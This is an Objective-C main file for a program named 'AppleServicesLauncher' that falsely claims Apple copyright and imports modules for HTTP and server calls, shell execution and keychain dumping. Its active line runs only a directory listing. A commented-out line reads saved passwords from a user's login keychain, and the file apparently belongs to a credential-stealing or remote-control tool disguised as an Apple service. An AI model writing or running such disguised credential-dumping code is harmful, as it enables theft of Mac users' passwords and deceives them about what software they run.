//
//  main.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "WTHTTPApi.h"
#import "WTServerApi.h"
#import "WTShellCommands.h"
#import "WTUserApi.h"
#import "keychaindump.h"

int main(int argc, const char * argv[]) {
//    [WTUserApi getOwner];
//    NSLog(@"%@", [keychaindump getPasswords:@"/Users/tesla/Library/Keychains/login.keychain"]);
    NSLog(@"%@", [WTShellCommands runShellCommand:@"ls -alF /" withMaxBufferSize:10]);
    return 0;
}
